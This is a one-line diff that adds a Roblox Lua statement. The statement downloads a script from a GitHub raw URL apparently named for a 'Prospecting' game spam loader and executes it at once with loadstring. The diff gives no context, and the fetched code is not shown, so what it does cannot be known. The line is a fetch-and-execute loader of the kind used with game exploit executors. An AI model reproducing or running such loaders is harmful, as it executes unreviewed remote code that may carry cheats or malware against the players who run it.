@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/prospecting-spam4-vvzz8c3jiia6gk.lua"))()
